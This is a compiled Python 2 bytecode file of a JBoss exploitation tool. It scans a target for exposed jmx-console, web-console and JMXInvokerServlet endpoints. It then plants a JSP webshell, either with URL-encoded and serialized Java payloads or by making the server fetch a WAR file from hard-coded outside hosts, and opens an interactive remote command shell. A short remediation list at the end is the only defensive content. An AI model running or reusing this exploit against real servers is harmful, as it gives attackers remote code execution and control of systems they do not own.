�
���Vc           @   s�  d  d l  Z  d  d l Z d  d l Z d  d l Z d  d l Z d  d l m Z d Z d Z d Z d Z	 d Z
 d Z d Z d	 �  Z d
 �  Z d �  Z d �  Z d �  Z d �  Z d �  Z d �  Z d �  Z d �  Z d �  Z d �  Z d �  Z d �  Z e j d d k r;e d e d e j d d e GHe j d � n  e e j � \ Z Z e d k rle j d Z  nl e d k r�e d e GHe d e j d e GHe j e � n+ e d k r�d  j! d! e j d g � Z  n  e e  � Z" xb d" d# d$ g D]Q Z# e" e# d% k se" e# d& k r�e$ d' � j% �  d( k rEe e  e# � qEq�q�We" j& �  j' d% � d k r}e d) e GHe	 d* GHn+ e" j& �  j' d+ � d k r�e	 d, e GHn  e GHd S(-   i����N(   t	   urlencodes   [91ms   [31ms   [94ms   [32ms   [1ms   [0mc         C   sK   |  j  d � } t | � d k r6 | d j  d � d S| j  d � d Sd  S(   Ns   ://i   i   t   :i    (   t   splitt   len(   t   urlt   tokens(    (    s   pwn.pyt   getHost   s    c         C   s+   |  j  d � } | d d k r# d Sd Sd  S(   Ns   ://i    t   httpst   http(   R   (   R   R   (    (    s   pwn.pyt   getProtocol   s    c         C   sK   |  d j  d � } t | � d k r- | d St |  � d k rC d Sd Sd  S(   Ni   R   i   i   R   i�  iP   (   R   R   R	   (   R   t   token(    (    s   pwn.pyt   getPort   s    c         C   sN   t  |  � d k r. t j t |  � t |  � � St j t |  � t |  � � Sd  S(   NR   (   R	   t   httplibt   HTTPSConnectionR   R   t   HTTPConnection(   R   (    (    s   pwn.pyt   getConnection%   s    c         C   s�   d } t  j d � t |  � } | j d | � | j �  j } | d k r� | j �  t  j d � t |  � } | j d | � | j �  j } | j �  n  | S(   Ni�  i   t   GETi   (   t   timet   sleepR   t   requestt   getresponset   statust   close(   R   t   patht   resultt   conn(    (    s   pwn.pyt   getSuccessfully,   s    
c         C   s�   t  d |  GHi d d 6d d 6d d 6} x� | j �  D]� } y� t  d | t Gt |  � } | j d	 | | � | j �  j | | <| | d
 k s� | | d k r� t d t GHn	 t  d GH| j �  Wq5 t d |  t GHd | | <q5 Xq5 W| S(   Ns    ** Checking Host: %s **
sN   /jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfos   jmx-consoles   /web-console/ServerInfo.jsps   web-consoles   /invoker/JMXInvokerServlett   JMXInvokerServlets    * Checking %s: 	t   HEADi�   i�  s   [ VULNERABLE ]s   [ OK ]s2   
 * An error ocurred while contaction the host %s
i�  (	   t   GREENt   keyst   ENDCR   R   R   R   t   REDR   (   R   R   t   iR   (    (    s   pwn.pyt   checkVul;   s$    

 	c         C   s�   t  d |  GHd } | d k rU t |  � } | d k r� | d k r� t |  � } q� n6 | d k rp t |  � } n | d k r� t |  � } n  | d k s� | d k r� t  d t GHt |  | � n t d	 t GHt j	 d
 � d  S(   Ns(   
 * Sending exploit code to %s. Wait...
i�  s   jmx-consolei�   i�  s   web-consoleR   s?    * Successfully deployed code! Starting command shell, wait...
st   
 * Could not exploit the flaw automatically. Exploitation requires manual analysis...
   Waiting for 7 seconds...
 i   (
   R   t   exploitJmxConsoleFileRepositoryt   exploitJmxConsoleMainDeployt   exploitWebConsoleInvokert   exploitJMXInvokerFileRepositoryR   t
   shell_httpR    R   R   (   R   t   typeR   (    (    s   pwn.pyt   autoExploitS   s    c         C   s.  | d k s | d k r! d } n | d k r6 d } n  t  |  � } | j d | � | j �  t j d � d } d	 GHt d
 |  d t GHi d d 6} xw d d d g D]f } t  |  � } t i | d 6� } | j d | | d | � | d | j �  j	 �  j
 d � d 7} q� W| Gxt d GHt d t � } | d k r@Pn  t  |  � } t i | d 6� } | j d | | d | � | j �  } | j d k r�t d GH| j �  qn  d } y | j	 �  j
 d � d } Wn t d GHn X| j d � d k rt d | j
 d � d t GHn | G| j �  qd  S(   Ns   jmx-consoles   web-consoles   /jbossass/jbossass.jsp?R   s   /shellinvoker/shellinvoker.jsp?R   i   t    sZ    * - - - - - - - - - - - - - - - - - - - - LOL - - - - - - - - - - - - - - - - - - - - * 
s    * s   : 
t   jexbosss
   User-Agents   uname -as   cat /etc/issuet   idt   pppt    t   >i   s#   [Type commands or "exit" to finish]s   Shell> t   exiti�  s:    * Error contacting the commando shell. Try again later...s   pre>s)   An exception occurred processing JSP pages!    * Error executing command "%s". t   =(   R   R   R   R   R   R    R   R    R   t   readR   t   BLUEt	   raw_inputR   t   count(   R   R(   R   R   t   respt   headerst   cmdt   stdout(    (    s   pwn.pyR'   m   sP    		
+		
!c         C   sc   d } d | } t  d | t GHt |  � } | j d | � | j �  j } | j �  t |  d � S(   Ns    http://125.46.92.66/jbossass.warsd   /jmx-console/HtmlAdaptor?action=invokeOp&name=jboss.system:service=MainDeployer&methodIndex=19&arg0=sV   
 * Info: This exploit will force the server to deploy the webshell 
   available on: R   s   /jbossass/jbossass.jsp(   R   R   R   R   R   R   R   R   (   R   t   jspt   payloadR   R   (    (    s   pwn.pyR$   �   s    
c         C   sV   d } d | d } t  |  � } | j d | � | j �  j } | j �  t |  d � S(   Nsn  %3C%25%40%20%70%61%67%65%20%69%6D%70%6F%72%74%3D%22%6A%61%76%61%2E%75%74%69%6C%2E%2A%2C%6A%61%76%61%2E%69%6F%2E%2A%22%25%3E%3C%70%72%65%3E%3C%25%20%69%66%20%28%72%65%71%75%65%73%74%2E%67%65%74%50%61%72%61%6D%65%74%65%72%28%22%70%70%70%22%29%20%21%3D%20%6E%75%6C%6C%20%26%26%20%72%65%71%75%65%73%74%2E%67%65%74%48%65%61%64%65%72%28%22%75%73%65%72%2D%61%67%65%6E%74%22%29%2E%65%71%75%61%6C%73%28%22%6A%65%78%62%6F%73%73%22%29%29%20%7B%20%50%72%6F%63%65%73%73%20%70%20%3D%20%52%75%6E%74%69%6D%65%2E%67%65%74%52%75%6E%74%69%6D%65%28%29%2E%65%78%65%63%28%72%65%71%75%65%73%74%2E%67%65%74%50%61%72%61%6D%65%74%65%72%28%22%70%70%70%22%29%29%3B%20%44%61%74%61%49%6E%70%75%74%53%74%72%65%61%6D%20%64%69%73%20%3D%20%6E%65%77%20%44%61%74%61%49%6E%70%75%74%53%74%72%65%61%6D%28%70%2E%67%65%74%49%6E%70%75%74%53%74%72%65%61%6D%28%29%29%3B%20%53%74%72%69%6E%67%20%64%69%73%72%20%3D%20%64%69%73%2E%72%65%61%64%4C%69%6E%65%28%29%3B%20%77%68%69%6C%65%20%28%20%64%69%73%72%20%21%3D%20%6E%75%6C%6C%20%29%20%7B%20%6F%75%74%2E%70%72%69%6E%74%6C%6E%28%64%69%73%72%29%3B%20%64%69%73%72%20%3D%20%64%69%73%2E%72%65%61%64%4C%69%6E%65%28%29%3B%20%7D%20%7D%25%3Es  /jmx-console/HtmlAdaptor?action=invokeOpByName&name=jboss.admin:service=DeploymentFileRepository&methodName=store&argType=java.lang.String&arg0=jbossass.war&argType=java.lang.String&arg1=jbossass&argType=java.lang.String&arg2=.jsp&argType=java.lang.String&arg3=s   &argType=boolean&arg4=TrueR   s   /jbossass/jbossass.jsp(   R   R   R   R   R   R   (   R   R:   R;   R   R   (    (    s   pwn.pyR#   �   s    
c         C   s�   d } t  |  � } i d d 6d d 6} | j d d | | � | j �  } | j } | d k r� d	 GH| j �  | j d
 d | | � | j �  } | j } n  | j �  j d � d k r� d } n  | j t |  d � S(   Ns�  �� sr )org.jboss.invocation.MarshalledInvocation��'A>��  xppwx��G��S�sr java.lang.Integer⠤���8 I valuexr java.lang.Number������  xp�,`�sr $org.jboss.invocation.MarshalledValue�����JЙ  xpz  �  ��� ur [Ljava.lang.Object;��X�s)l  xp   sr javax.management.ObjectName��m�  xpt ,jboss.admin:service=DeploymentFileRepositoryxt storeuq ~     t shellinvoker.wart shellinvokert .jspty<%@ page import="java.util.*,java.io.*"%><pre><%if(request.getParameter("ppp") != null && request.getHeader("user-agent").equals("jexboss") ) { Process p = Runtime.getRuntime().exec(request.getParameter("ppp")); DataInputStream dis = new DataInputStream(p.getInputStream()); String disr = dis.readLine(); while ( disr != null ) { out.println(disr); disr = dis.readLine(); } }%>sr java.lang.Boolean� r�՜�� Z valuexpur [Ljava.lang.String;��V��{G  xp   t java.lang.Stringq ~ q ~ q ~ t booleancy��xw       sr "org.jboss.invocation.InvocationKey��r�ד�� I ordinalxp   pxsP   application/x-java-serialized-object; class=org.jboss.invocation.MarshalledValues   Content-Types4   text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2t   Acceptt   POSTs   /invoker/JMXInvokerServleti�  s      Retrying...R   t   Failedi    i�  s   /shellinvoker/shellinvoker.jsp(   R   R   R   R   R   R2   R5   R   (   R   R;   R   R7   t   responseR   (    (    s   pwn.pyR&   �   s"    ?

	
	c         C   s�   d } t  |  � } i d d 6d d 6} | j d d | | � | j �  } | j } | d k r� d	 GH| j �  | j d
 d | | � | j �  } | j } n  | j t |  d � S(   Ns�  �� sr .org.jboss.console.remote.RemoteMBeanInvocation�O�zt��� L 
actionNamet Ljava/lang/String;[ paramst [Ljava/lang/Object;[ 	signaturet [Ljava/lang/String;L targetObjectNamet Ljavax/management/ObjectName;xpt deployur [Ljava.lang.Object;��X�s)l  xp   t *http://www.joaomatosf.com/rnp/jbossass.warur [Ljava.lang.String;��V��{G  xp   t java.lang.Stringsr javax.management.ObjectName��m�  xpt !jboss.system:service=MainDeployerxsZ   application/x-java-serialized-object; class=org.jboss.console.remote.RemoteMBeanInvocations   Content-Types4   text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2R<   R=   s   /web-console/Invokeri�  s      Retrying...R   s   /jbossass/jbossass.jsp(   R   R   R   R   R   R   (   R   R;   R   R7   R?   R   (    (    s   pwn.pyR%   #  s    !

	
c           C   sB   t  j d k r t  j d � n t  j d k r> t  j d � n  d  S(   Nt   posixt   cleart   cet   ntt   dost   cls(   RB   s   ntRD   (   t   ost   namet   system(    (    (    s   pwn.pyRA   [  s    c         C   s�   t  |  � d k  s+ |  d j d � d k  r/ d St  |  d j d � � d k rj d d |  d |  d f f S|  d j d � d k r� |  d j d � d k r� d Sd Sd  S(   Ni   i   t   .s>   You must provide the host name or IP address you want to test.s   ://s$   Changing address "%s" to "http://%s"R   i    R*   s   Parâmetro inválido(   i   s>   You must provide the host name or IP address you want to test.(   i    R*   (   i   s   Parâmetro inválido(   R   R5   R   (   t   args(    (    s   pwn.pyt	   checkArgsa  s    +2i    i   sZ   
 * Not compatible with version 3 of python.
   Please run it with version 2.7 or lower.

s    * Example:
   python2.7 s    https://site.com

i   s   
 * Error: %ss*   
 Example:
 python %s https://site.com.br
i   R*   s   http://s   jmx-consoles   web-consoleR   i�   i�  s      Continue ? (Yes/No)   t   ys)    Results: potentially compromised server!s   * - - - - - - -  - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -*

 Recommendations: 
 - Remove web consoles and services that are not used, eg:
    $ rm web-console.war
    $ rm http-invoker.sar
    $ rm jmx-console.war
    $ rm jmx-invoker-adaptor-server.sar
    $ rm admin-console.war
 - Use a reverse proxy (eg. nginx, apache, f5)
 - Limit access to the server only via reverse proxy (eg. DROP INPUT POLICY)
 - Search vestiges of exploitation within the directories "deploy" or "management".

 References:
   [1] - https://developer.jboss.org/wiki/SecureTheJmxConsole
   [2] - https://issues.jboss.org/secure/attachment/12313982/jboss-securejmx.pdf

 - If possible, discard this server!

 * - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -*
i�  sC   

 * Results: 
   The server is not vulnerable to bugs tested ...

((   R   t   syst   urllibRF   R   R    R    t   RED1R3   R   t   BOLDt   NORMALR   R   R	   R   R   R   R"   R)   R'   R$   R#   R&   R%   RA   RK   t   version_infot   argvR0   R   t   messageR   t   joint	   mapResultR!   R4   t   lowert   valuesR5   (    (    (    s   pwn.pyt   <module>   sZ   <									.		$	T	8		$ 